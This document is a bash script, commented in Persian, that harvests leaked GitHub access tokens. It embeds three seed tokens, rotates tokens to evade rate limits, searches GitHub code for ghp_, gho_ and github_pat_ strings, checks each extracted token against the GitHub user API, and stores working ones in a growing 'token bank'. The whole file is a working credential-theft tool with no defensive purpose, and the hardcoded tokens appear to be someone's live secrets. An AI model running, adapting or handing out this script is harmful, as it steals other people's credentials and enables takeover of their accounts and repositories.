#!/bin/bash
set -euo pipefail

# --- توکن‌های اولیه (seed) ---
SEED_TOKENS=(
  "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"
  "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"
  "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"
)

TOKEN_FILE="tokens.txt"

# --- توابع کمکی ---
load_tokens() {
  local tokens=()
  if [ -f "$TOKEN_FILE" ] && [ -s "$TOKEN_FILE" ]; then
    while IFS= read -r line; do
      [[ -z "$line" ]] && continue
      tokens+=("$line")
    done < "$TOKEN_FILE"
  fi
  for t in "${SEED_TOKENS[@]}"; do
    if ! printf '%s\n' "${tokens[@]}" | grep -qxF "$t"; then
      tokens+=("$t")
    fi
  done
  printf '%s\n' "${tokens[@]}" | sort -u
}

save_tokens() {
  printf '%s\n' "$@" | sort -u > "$TOKEN_FILE"
}

# چک کردن سهمیه‌ی یک توکن، خروجی: remaining count (عدد)
get_remaining() {
  local token="$1"
  curl -sS -H "Authorization: token $token" \
    "https://api.github.com/rate_limit" 2>/dev/null | \
    jq -r '.resources.core.remaining // .rate.remaining // 0'
}

# انتخاب بهترین توکن از آرایه‌ی سراسری TOKENS (بیشترین باقیمانده)
pick_best_token() {
  local best_token=""
  local best_rem=-1
  for token in "${TOKENS[@]}"; do
    local rem
    rem=$(get_remaining "$token") || continue
    echo "  Token ${token:0:12}... remaining=$rem" >&2
    if [ "$rem" -gt "$best_rem" ]; then
      best_rem=$rem
      best_token=$token
    fi
  done
  if [ -z "$best_token" ] || [ "$best_rem" -eq 0 ]; then
    echo "ERROR: All tokens have 0 remaining. Wait for rate limit reset." >&2
    return 1
  fi
  echo "$best_token"
}

# --- آغاز اسکریپت ---
echo "[*] Loading token bank..." >&2
mapfile -t TOKENS < <(load_tokens)
echo "Loaded ${#TOKENS[@]} unique tokens." >&2

# ذخیره‌ی اولیه (اگر تغییری کرده)
save_tokens "${TOKENS[@]}"

# تلاش برای انتخاب یه توکن با سهمیه
BEST_TOKEN=$(pick_best_token) || exit 1
echo "[*] Best token selected: ${BEST_TOKEN:0:12}..." >&2

# ---- جستجوی کد ----
SEARCH_QUERY='ghp_+OR+gho_+OR+github_pat_'
MAX_PAGES=10
PER_PAGE=100
CANDIDATES_TMP=$(mktemp)

echo "[*] Starting code search (up to $MAX_PAGES pages)..." >&2
page=1
while [ $page -le $MAX_PAGES ]; do
  # چک سریع سهمیه‌ی توکن فعلی
  if [ "$(get_remaining "$BEST_TOKEN")" -lt 1 ]; then
    echo "[!] Token ${BEST_TOKEN:0:12} exhausted, picking new one..." >&2
    BEST_TOKEN=$(pick_best_token) || break
  fi

  echo "[*] Page $page with token ${BEST_TOKEN:0:12}..." >&2
  response=$(curl -sS -H "Authorization: token $BEST_TOKEN" \
    -H "Accept: application/vnd.github.text-match+json" \
    "https://api.github.com/search/code?q=$SEARCH_QUERY&per_page=$PER_PAGE&page=$page")

  # اگر خالی برگشت یا خطا، متوقف شو
  if [ -z "$response" ]; then
    echo "[!] Empty response, stopping search." >&2
    break
  fi

  # استخراج fragment‌ها
  matches=$(echo "$response" | jq -r '
    .items[]?.text_matches[]?.fragment // empty
  ' 2>/dev/null || true)

  if [ -n "$matches" ]; then
    # بیرون کشیدن توکن‌ها با رجیکس
    echo "$matches" | grep -oP '\bgh[po]_[A-Za-z0-9_]{36,}\b|\bgithub_pat_[A-Za-z0-9_]{22,}\b' >> "$CANDIDATES_TMP"
  fi

  total_count=$(echo "$response" | jq -r '.total_count // 0')
  echo "  Found $total_count total results, page $page extracted $(echo "$matches" | wc -l) fragments." >&2

  # اگر صفحه‌ی آخر بودیم، تموم کن
  if [ $((page * PER_PAGE)) -ge "$total_count" ]; then
    break
  fi

  page=$((page + 1))
  sleep 2
done

# --- پردازش کاندیدها ---
if [ ! -s "$CANDIDATES_TMP" ]; then
  echo "[*] No candidate tokens found." >&2
  rm -f "$CANDIDATES_TMP"
  exit 0
fi

sort -u -o "$CANDIDATES_TMP" "$CANDIDATES_TMP"
echo "[*] Testing $(wc -l < "$CANDIDATES_TMP") unique candidates..." >&2

VALID_TMP=$(mktemp)
while IFS= read -r candidate; do
  [ -z "$candidate" ] && continue
  http_code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: token $candidate" \
    "https://api.github.com/user")
  if [ "$http_code" = "200" ]; then
    echo "[+] VALID: $candidate" >&2
    echo "$candidate" >> "$VALID_TMP"
  fi
  sleep 0.5
done < "$CANDIDATES_TMP"

# --- ذخیره‌سازی نهایی ---
if [ -s "$VALID_TMP" ]; then
  mapfile -t CURRENT_BANK < <(load_tokens)
  while IFS= read -r new_tok; do
    CURRENT_BANK+=("$new_tok")
  done < "$VALID_TMP"
  save_tokens "${CURRENT_BANK[@]}"
  echo "[*] Bank updated. New size: $(wc -l < "$TOKEN_FILE")" >&2
else
  echo "[*] No valid tokens added." >&2
fi

rm -f "$CANDIDATES_TMP" "$VALID_TMP"
